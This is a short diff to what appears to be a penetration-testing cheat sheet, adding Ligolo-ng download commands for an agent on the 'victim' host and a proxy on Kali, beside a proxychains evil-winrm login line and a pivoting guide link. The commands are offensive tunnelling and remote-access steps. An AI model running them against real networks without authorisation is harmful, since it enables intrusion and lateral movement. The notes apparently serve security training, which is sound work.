@@ -1861,7 +1861,9 @@ proxychains -q evil-winrm -i 10.0.60.99 -u 'domain\user' -p ''
 ```
 
 ### Using Ligolo-ng
-
+- Agent (victim): `sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz`
+- Proxy (Kali): `sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz`
+- [Full guide](https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740)
 
 ## compiling windows exploit on kali
 ```bash
